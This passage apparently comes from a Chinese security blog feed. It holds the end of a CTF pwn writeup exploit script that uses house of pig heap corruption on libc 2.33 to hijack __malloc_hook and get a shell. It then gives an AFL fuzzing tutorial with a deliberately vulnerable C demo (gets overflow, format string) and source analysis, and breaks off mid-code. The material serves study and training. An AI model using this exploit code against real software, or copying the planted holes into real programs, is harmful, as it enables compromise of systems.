class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x880</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x890</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8a0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x8b0</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8c0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x60</span> - <span class="number">0x10</span>) ^ key)+ p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x90</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Dlete(<span class="number">1</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(key ^ (heap_base + <span class="number">0x810</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(key))</span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x04-附件"><a href="#0x04-附件" class="headerlink" title="0x04 附件"></a>0x04 附件</h2><p>链接: <a href="https://pan.baidu.com/s/1okMdhQF0z8RQmEOCQM6eng" target="_blank" rel="noopener">https://pan.baidu.com/s/1okMdhQF0z8RQmEOCQM6eng</a> 提取码: 5871</p><h2 id="0x05参考"><a href="#0x05参考" class="headerlink" title="0x05参考"></a>0x05参考</h2><p>!(<a href="https://www.anquanke.com/post/id/242640" target="_blank" rel="noopener">house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以最近在西湖论剑上碰到的题目，TinyNode来记录下libc2-33下，house of pig的利用流程&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>AFL初探</title>
    <link href="wood1314.github.io/year/11/19/clgvp3n4600036n3fgliu6j2w/"/>
    <id>wood1314.github.io/year/11/19/clgvp3n4600036n3fgliu6j2w/</id>
    <published>2021-11-19T14:53:07.000Z</published>
    <updated>2021-11-19T15:25:05.036Z</updated>
    
    <content type="html"><![CDATA[<p>最近在写跟AFL有关的fuzz，因此就大概过了一下AFL的源码。这里大概记录一下自己看的过程。</p><a id="more"></a><h2 id="0x01-AFL基本使用"><a href="#0x01-AFL基本使用" class="headerlink" title="0x01 AFL基本使用"></a>0x01 AFL基本使用</h2><h3 id="1-1-使用AFL程序插桩"><a href="#1-1-使用AFL程序插桩" class="headerlink" title="1.1 使用AFL程序插桩"></a>1.1 使用AFL程序插桩</h3><p>目标程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用afl-gcc进行插桩编译</p><blockquote><p>afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c</p></blockquote><h3 id="1-2-开始fuzz"><a href="#1-2-开始fuzz" class="headerlink" title="1.2 开始fuzz"></a>1.2 开始fuzz</h3><blockquote><p>afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f</p></blockquote><p>PS: 常见参数的含义如下</p><ul><li>f参数表示：testcase的内容会作为afl_test的stdin</li><li>m参数表示分配的内存空间</li><li>i 指定测试样本的路径</li><li>o 指定输出结果的路径</li><li>/dev/null 使错误信息不输出到屏幕</li><li>t：设置程序运行超时值，单位为 ms</li><li>M：运行主(Master) Fuzzer</li><li>S：运行从属(Slave) Fuzzer</li></ul><h3 id="1-3-fuzz的结果"><a href="#1-3-fuzz的结果" class="headerlink" title="1.3 fuzz的结果"></a>1.3 fuzz的结果</h3><p><img src="https://pic.imgdb.cn/item/6197bea02ab3f51d910dd366.png" alt="Image.png"></p><p>从界面上主要注意以下几点:</p><ol><li>last new path 如果报错那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）；</li><li>cycles done 如果变绿就说明后面及时继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</li><li>uniq crashes 代表的是crash的数量</li></ol><h3 id="1-4-crash分析"><a href="#1-4-crash分析" class="headerlink" title="1.4 crash分析"></a>1.4 crash分析</h3><p><img src="https://pic.imgdb.cn/item/6197beb62ab3f51d910de2e1.png" alt="Image [2].png"></p><p>PS: xxd命令的作用就是将一个文件以十六进制的形式显示出来</p><p>看起来上面两个crash，第一个大概是栈溢出，第二个看起来是F开头，字符长度为6触发的</p><h2 id="0x02-源码阅读"><a href="#0x02-源码阅读" class="headerlink" title="0x02 源码阅读"></a>0x02 源码阅读</h2><h3 id="2-1-合法代码插桩——插入调用-afl-maybe-log的汇编码"><a href="#2-1-合法代码插桩——插入调用-afl-maybe-log的汇编码" class="headerlink" title="2.1 合法代码插桩——插入调用__afl_maybe_log的汇编码"></a>2.1 合法代码插桩——插入调用__afl_maybe_log的汇编码</h3><p>若<code>pass_thru</code>、<code>skip_intel</code>、<code>skip_app</code>、<code>skip_csect</code>四个标志位均被清除，且<code>instr_ok</code>(这个标志位表征当前读入的行处于.text部分，将在后续设置，初始为清除状态)、<code>instrument_next</code>两个标志位均被设置，且当前行的第一个字符是<code>\\t</code>且第二个字符是字母，则向已插桩的文件写入<code>trampoline_fmt_64/trampoline_fmt_32</code>(取决于use_64bit标志位状态)<br>经整理最后插入的汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/* --- AFL TRAMPOLINE (32-BIT) --- */</span><br><span class="line">.align 4</span><br><span class="line">leal -16(%esp), %esp</span><br><span class="line">movl %edi,  0(%esp)</span><br><span class="line">movl %edx,  4(%esp)</span><br><span class="line">movl %ecx,  8(%esp)</span><br><span class="line">movl %eax, 12(%esp)</span><br><span class="line">movl $0x%08x, %ecx</span><br><span class="line">call __afl_maybe_log</span><br><span class="line">movl 12(%esp), %eax</span><br><span class="line">movl  8(%esp), %ecx</span><br><span class="line">movl  4(%esp), %edx</span><br><span class="line">movl  0(%esp), %edi</span><br><span class="line">leal 16(%esp), %esp</span><br><span class="line">/* --- END --- */</span><br><span class="line"></span><br><span class="line">/* --- AFL TRAMPOLINE (64-BIT) --- */</span><br><span class="line">.align 4</span><br><span class="line">leaq -(128+24)(%rsp), %rsp</span><br><span class="line">movq %rdx,  0(%rsp)</span><br><span class="line">movq %rcx,  8(%rsp)</span><br><span class="line">movq %rax, 16(%rsp)</span><br><span class="line">movq $0x%08x, %rcx</span><br><span class="line">call __afl_maybe_log</span><br><span class="line">movq 16(%rsp), %rax</span><br><span class="line">movq  8(%rsp), %rcx</span><br><span class="line">movq  0(%rsp), %rdx</span><br><span class="line">leaq (128+24)(%rsp), %rsp</span><br><span class="line">/* --- END --- */</span><br></pre></td></tr></table></figure><p>⚠️：此处的<code>%08x</code>由<code>(random() % ((1 &lt;&lt; 16)))</code>生成，在编译期确定。插入结束后，将<code>instrument_next</code>标志位清除，桩代码计数器<code>ins_lines</code>加一。最后将原始的汇编码（即line变量的内容），追加到插桩后文件中。此时检查<code>pass_thru</code>标志位是否被置位，若已置位，则忽略以下流程，继续循环，读取下一行待插桩文件。</p><h3 id="2-2-寻找合法有效的待插桩段"><a href="#2-2-寻找合法有效的待插桩段" class="headerlink" title="2.2 寻找合法有效的待插桩段"></a>2.2 寻找合法有效的待插桩段</h3><p>这里是真正的插桩函数的核心了，但是在这里我们真正感兴趣的事实上只有<code>.text</code>段</p><p>简单概括就是，先找到<code>.text</code>段，不在该段的情况下不会进行打桩操作</p><p>然后会在分支跳转（条件分支跳转）的部分插入<code>trampoline_fmt_64/trampoline_fmt_32</code></p><p>注意，JMP表示无条件跳转，因此其另一条分支将永远不会被运行到，那么将不会影响代码覆盖率，因此不在JMP指令后插桩。</p><p>识别label以后，会在label的下一行插入<code>trampoline_fmt_64/trampoline_fmt_32</code></p><h3 id="2-3-末尾插桩代码"><a href="#2-3-末尾插桩代码" class="headerlink" title="2.3 末尾插桩代码"></a>2.3 末尾插桩代码</h3><p>最后，若桩代码计数器<code>ins_lines</code>不为0，那么将<code>main_payload_64/main_payload_32</code>(取决于use_64bit标志位状态)插入整个汇编文件末尾。</p><p>main_payload_64整体逻辑如下</p><p>简要概括就是，将随机生成的<code>rcx</code>与一个值做一个抑或，再把以此作为索引的共享区加一。<br>相当于一个散列表，这样可以知道fuzz是不是经过了一个新的基本块。</p><h2 id="0x03-AFL-变异部分源码分析"><a href="#0x03-AFL-变异部分源码分析" class="headerlink" title="0x03 AFL 变异部分源码分析"></a>0x03 AFL 变异部分源码分析</h2><h3 id="3-1-fuzz-one"><a href="#3-1-fuzz-one" class="headerlink" title="3.1 fuzz_one"></a>3.1 fuzz_one</h3><blockquote><p>Take the current entry from the queue, fuzz it for a while. This function is a tad too long…</p></blockquote><p>首先把testcase映射在内存中，主要是把<code>testcase</code>里的内容读进<code>in_buf</code>里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Map the test case into memory. */</span></span><br><span class="line"></span><br><span class="line">  fd = open(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">"Unable to open '%s'"</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  orig_in = in_buf = mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (orig_in == MAP_FAILED) PFATAL(<span class="string">"Unable to mmap '%s'"</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br></pre></td></tr></table></figure><p>接着对testcase进行一个裁剪的过程，然后把<code>in_buf</code>里的内容拷贝到<code>out_buf</code>里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************</span></span><br><span class="line"><span class="comment">   * TRIMMING *</span></span><br><span class="line"><span class="comment">   ************/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = trim_case(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      FATAL(<span class="string">"Unable to execute target application"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don't retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br></pre></td></tr></table></figure><p>计算<code>performance</code> <code>score</code> ,这个值的计算方法有点复杂，先留个坑，暂且不深究</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment">   * PERFORMANCE SCORE *</span></span><br><span class="line"><span class="comment">   *********************/</span></span><br><span class="line"></span><br><span class="line">  orig_perf = perf_score = calculate_score(queue_cur);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span></span><br><span class="line"><span class="comment">     this entry ourselves (was_fuzzed), or if it has gone through deterministic</span></span><br><span class="line"><span class="comment">     testing in earlier, resumed runs (passed_det). */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">     for this master instance. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  doing_det = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>第一阶段的<code>Bitflip</code> 也就是 <code>bitflip 1/1</code>  ，可以看到 <code>stage_max = len &lt;&lt; 3;</code>  然后进行了<code>stage_max</code>次数的循环，也就是每字节会做8次bitflip，逐个字节逐个比特进行反转。</p><p>反转后调用<code>common_fuzz_stuff</code>  函数，进行fuzz，fuzz过后再次把比特反转回复过来。</p><p>在这个阶段还实现了采集<code>token</code>的功能。即如果连续几个字节，反转其最后一个比特后其执行路径相同，且与初始路径不同。那么这连续的几个字节很大概率是有特殊语义的<code>token</code> ，属于关键字性质的。</p><p>例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">........IHDR........</span><br></pre></td></tr></table></figure><p>当翻转到字符<code>I</code>的最高位时，因为<code>IHDR</code>被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，<code>IHDR</code>标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：<code>IHDR</code>，并将其记录下来为后面的变异提供备选。</p><p>AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在<code>config.h</code>中通过宏定义了限制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Length limits for auto-detected dictionary tokens: */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_AUTO_EXTRA 3 #<span class="meta-keyword">define</span> MAX_AUTO_EXTRA 32 </span></span><br><span class="line"><span class="comment">/* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USE_AUTO_EXTRAS 10 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10)</span></span><br></pre></td></tr></table></figure><p>对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改MAX_AUTO_EXTRA为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*********************************************</span></span><br><span class="line"><span class="comment">   * SIMPLE BITFLIP (+dictionary construction) *</span></span><br><span class="line"><span class="comment">   *********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line">    u8* _arf = (u8*)(_ar); \</span><br><span class="line">    u32 _bf = (_b); \</span><br><span class="line">    _arf[(_bf) &gt;&gt; <span class="number">3</span>] ^= (<span class="number">128</span> &gt;&gt; ((_bf) &amp; <span class="number">7</span>)); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Single walking bit. */</span></span><br><span class="line"></span><br><span class="line">  stage_short = <span class="string">"flip1"</span>;</span><br><span class="line">  stage_max   = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  stage_name  = <span class="string">"bitflip 1/1"</span>;</span><br><span class="line"></span><br><span class="line">  stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  prev_cksum = queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While flipping the least significant bit in every byte, pull of an extra</span></span><br><span class="line"><span class="comment">       trick to detect possible syntax tokens. In essence, the idea is that if</span></span><br><span class="line"><span class="comment">       you have a binary blob like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       xxxxxxxxIHDRxxxxxxxx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...and changing the leading and trailing bytes causes variable or no</span></span><br><span class="line"><span class="comment">       changes in program flow, but touching any character in the "IHDR" string</span></span><br><span class="line"><span class="comment">       always produces the same, distinctive path, it's highly likely that</span></span><br><span class="line"><span class="comment">       "IHDR" is an atomically-checked magic value of special significance to</span></span><br><span class="line"><span class="comment">       the fuzzed format.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We do this here, rather than as a separate stage, because it's a nice</span></span><br><span class="line"><span class="comment">       way to keep the operation approximately "free" (i.e., no extra execs).</span></span><br><span class="line"><span class="comment">       </span></span><br><span class="line"><span class="comment">       Empirically, performing the check when flipping the least significant bit</span></span><br><span class="line"><span class="comment">       is advantageous, compared to doing it at the time of more disruptive</span></span><br><span class="line"><span class="comment">       changes, where the program flow may be affected in more violent ways.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The caveat is that we won't generate dictionaries in the -d mode or -S</span></span><br><span class="line"><span class="comment">       mode - but that's probably a fair trade-off.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       This won't work particularly well with paths that exhibit variable</span></span><br><span class="line"><span class="comment">       behavior, but fails gracefully, so we'll carry out the checks anyway.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line"></span><br><span class="line">      u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If at end of file and we are still collecting a string, grab the</span></span><br><span class="line"><span class="comment">           final character and force output. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len 